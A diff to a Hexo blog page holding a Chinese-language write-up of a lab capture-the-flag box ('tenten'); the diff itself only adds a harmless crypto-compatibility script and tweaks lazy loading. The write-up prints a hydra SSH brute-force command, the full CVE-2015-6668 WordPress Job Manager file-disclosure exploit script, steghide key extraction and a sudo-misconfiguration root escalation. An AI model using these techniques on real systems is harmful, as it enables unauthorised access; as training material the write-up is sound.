@@ -9,7 +9,22 @@
     }
     </style>
 
-  
+  <script>
+    // 强制内网 IP 识别为安全上下文
+    if (window.location.hostname !== 'localhost' && window.location.protocol === 'http:') {
+        // 尝试手动映射 crypto 属性
+        if (!window.crypto.subtle && window.crypto.webkitSubtle) {
+            window.crypto.subtle = window.crypto.webkitSubtle;
+        }
+    }
+    
+    // 终极补丁：如果还是没有 subtle，则创建一个占位符避免报错
+    // 提示：这通常能解决加载报错，但如果插件强依赖原生加密，建议执行下面的“降级”预判
+    if (!window.isSecureContext) {
+        console.warn('当前环境非安全上下文，正在尝试兼容内网加密解密...');
+    }
+</script>
+
 
 <head>
   <meta charset="UTF-8">
@@ -61,7 +76,7 @@
 
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
-    var CONFIG = {"hostname":"192.168.126.129","root":"/","version":"1.8.7","typing":{"enable":false,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+    var CONFIG = {"hostname":"192.168.126.129","root":"/","version":"1.8.7","typing":{"enable":false,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":false,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
   </script>
   <script  src="/js/utils.js" ></script>
   <script  src="/js/color-schema.js" ></script>
@@ -234,13 +249,13 @@
 <p>useful info: </p>
 <figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">Apache</span>/<span class="hljs-number">2</span>.<span class="hljs-number">4</span>.<span class="hljs-number">18</span> (Ubuntu)<br><span class="hljs-attribute">WordPress</span> version <span class="hljs-number">4</span>.<span class="hljs-number">7</span>.<span class="hljs-number">3</span><br><span class="hljs-attribute">valid</span> user: takis<br><span class="hljs-attribute">http</span>://<span class="hljs-number">10.10.10.10</span>/wp-login.php<br></code></pre></div></td></tr></table></figure>
 <ul>
-<li>trying1<br><img src="/1.PNG" srcset="/img/loading.gif"><br>WordPress 2.3-4.8.3 - Host Header Injection in Password Reset</li>
+<li>trying1<br><img src="/1.PNG"><br>WordPress 2.3-4.8.3 - Host Header Injection in Password Reset</li>
 </ul>
 <p>这是第二次遇到低版本wordpress，并验证主机头注入了，但第一次是邮件发送插件未安装，第二次直接500服务器错误。无语。</p>
 <ul>
 <li><p>trying2<br>takis，以该用户名，burp intruder尝试弱密码。</p>
 </li>
-<li><p>trying3<br>openssh验证有效的用户，尝试弱密码<br><img src="/2.PNG" srcset="/img/loading.gif"></p>
+<li><p>trying3<br>openssh验证有效的用户，尝试弱密码<br><img src="/2.PNG"></p>
 </li>
 </ul>
 <p>hydra -l takis -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt 10.10.10.10 ssh</p>
@@ -250,15 +265,15 @@
 <li>trying4：exp查找<br>search type:exploit wordpress cve:2016</li>
 </ul>
 <p>像这种cms，又没检查出弱密码，又没有检查出可用exp，菜的不行&#x3D;&#x3D;</p>
-<h2 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h2><p>当时我用wpscan，检查过了插件job manager。由于只有xss漏洞，所以没有在意。<br><img src="/4.PNG" srcset="/img/loading.gif"></p>
-<p>32 vulnerabilities identified:     –》 wpscan扫描结果有32个漏洞，再加上youtube上看到一些0day的exp演示视频，高大上的不行。成功把我这只菜鸟给绕糊涂了。<br><img src="/3.PNG" srcset="/img/loading.gif"></p>
+<h2 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h2><p>当时我用wpscan，检查过了插件job manager。由于只有xss漏洞，所以没有在意。<br><img src="/4.PNG"></p>
+<p>32 vulnerabilities identified:     –》 wpscan扫描结果有32个漏洞，再加上youtube上看到一些0day的exp演示视频，高大上的不行。成功把我这只菜鸟给绕糊涂了。<br><img src="/3.PNG"></p>
 <p><a target="_blank" rel="noopener" href="https://vagmour.eu/cve-2015-6668-cv-filename-disclosure-on-job-manager-wordpress-plugin/">https://vagmour.eu/cve-2015-6668-cv-filename-disclosure-on-job-manager-wordpress-plugin/</a></p>
 <h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;&quot;&quot;  </span><br><span class="hljs-string">CVE-2015-6668  </span><br><span class="hljs-string">Title: CV filename disclosure on Job-Manager WP Plugin  </span><br><span class="hljs-string">Author: Evangelos Mourikis  </span><br><span class="hljs-string">Blog: https://vagmour.eu  </span><br><span class="hljs-string">Plugin URL: http://www.wp-jobmanager.com  </span><br><span class="hljs-string">Versions: &lt;=0.7.25  </span><br><span class="hljs-string">&quot;&quot;&quot;</span>  <br>website = raw_input(<span class="hljs-string">&#x27;Enter a vulnerable website: &#x27;</span>)  <br>filename = raw_input(<span class="hljs-string">&#x27;Enter a file name: &#x27;</span>)<br><br>filename2 = filename.replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;-&quot;</span>)<br><br><span class="hljs-keyword">for</span> year <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2016</span>,<span class="hljs-number">2018</span>):  <br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">13</span>):<br>        <span class="hljs-keyword">for</span> extension <span class="hljs-keyword">in</span> &#123;<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;jpeg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>&#125;:<br>            URL = website + <span class="hljs-string">&quot;/wp-content/uploads/&quot;</span> + <span class="hljs-built_in">str</span>(year) + <span class="hljs-string">&quot;/&quot;</span> + <span class="hljs-string">&quot;&#123;:02&#125;&quot;</span>.<span class="hljs-built_in">format</span>(i) + <span class="hljs-string">&quot;/&quot;</span> + filename2 + <span class="hljs-string">&quot;.&quot;</span> + extension<br>            req = requests.get(URL)<br>            <span class="hljs-keyword">if</span> req.status_code==<span class="hljs-number">200</span>:<br>                <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+] URL of CV found! &quot;</span> + URL<br></code></pre></div></td></tr></table></figure>
 
-<p><img src="/5.PNG" srcset="/img/loading.gif"></p>
+<p><img src="/5.PNG"></p>
 <figure class="highlight elixir"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs elixir">wget <span class="hljs-number">10.10</span>.<span class="hljs-number">10.10</span>/wp-content/uploads/<span class="hljs-number">2017</span>/<span class="hljs-number">04</span>/<span class="hljs-title class_">HackerAccessGranted</span>.jpg<br><br>steghide extract -sf <span class="hljs-title class_">HackerAccessGranted</span>.jpg<br><br>superpassword（通过hydra可得到）<br><br>chmod <span class="hljs-number">400</span> id_rsa<br>ssh -i id_rsa takis<span class="hljs-variable">@10</span>.<span class="hljs-number">10.10</span>.<span class="hljs-number">10</span><br><br>成功连接：<br>sudo -l<br><span class="hljs-title class_">Matching</span> <span class="hljs-title class_">Defaults</span> entries <span class="hljs-keyword">for</span> takis on <span class="hljs-symbol">tenten:</span><br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\<span class="hljs-symbol">:/usr/local/bin</span>\<span class="hljs-symbol">:/usr/sbin</span>\<span class="hljs-symbol">:/usr/bin</span>\<span class="hljs-symbol">:/sbin</span>\<span class="hljs-symbol">:/bin</span>\<span class="hljs-symbol">:/snap/bin</span><br><br><span class="hljs-title class_">User</span> takis may run the following commands on <span class="hljs-symbol">tenten:</span><br>    (<span class="hljs-title class_">ALL</span> : <span class="hljs-title class_">ALL</span>) <span class="hljs-title class_">ALL</span><br>    (<span class="hljs-title class_">ALL</span>) <span class="hljs-symbol">NOPASSWD:</span> /bin/fuckin<br><br>file /bin/fuckin<br>/bin/<span class="hljs-symbol">fuckin:</span> <span class="hljs-title class_">Bourne</span>-<span class="hljs-title class_">Again</span> shell script, <span class="hljs-title class_">ASCII</span> text executable<br><br>cat /bin/fuckin<br><span class="hljs-comment">#!/bin/bash</span><br><span class="hljs-variable">$1</span> <span class="hljs-variable">$2</span> <span class="hljs-variable">$3</span> <span class="hljs-variable">$4</span><br></code></pre></div></td></tr></table></figure>
 <p>对bash script变量不是很熟悉，于是在本地写一个，运行试一下。</p>
-<p><img src="/6.PNG" srcset="/img/loading.gif"></p>
+<p><img src="/6.PNG"></p>
 <figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-variable">$1</span> 代表给脚本传递的第一个参数<br><br><span class="hljs-variable">$2</span> 传递的第二个参数，以此类推<br><br><span class="hljs-built_in">sudo</span> /bin/fuckin su<br>因为/bin/fuckin不需要输入密码，并且以root运行，所以运行了su，获得root用户。<br><br><span class="hljs-comment">## 总结</span><br>要点是扫描到HackerAccessGranted的目录，通过cv文件名泄露漏洞，通过隐写术获取到id_rsa以及隐藏的密码<br><br>ssh登陆后，<span class="hljs-built_in">sudo</span> -l利用权限错误，执行root权限即可。<br></code></pre></div></td></tr></table></figure>
             </div>
             <hr>
@@ -395,10 +410,6 @@
 
 <!-- Plugins -->
 
-
-  
-    <script  src="/js/lazyload.js" ></script>
-  
 
 
 
